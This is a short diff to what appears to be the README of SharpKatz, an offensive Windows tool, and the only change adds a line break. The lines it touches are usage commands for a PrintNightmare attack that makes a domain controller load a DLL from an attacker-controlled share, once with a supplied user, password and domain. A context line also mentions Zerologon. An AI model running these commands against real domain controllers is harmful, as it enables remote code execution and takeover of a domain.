@@ -107,7 +107,7 @@ Note: Do not use zerologon in a production environment or at least plan for reco
 ```SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll```
 Perform PrintNightmare attack <br>
 <br>
-```SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```
+```SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```<br>
 Perform PrintNightmare attack with provided credentials<br>
 <br>
 
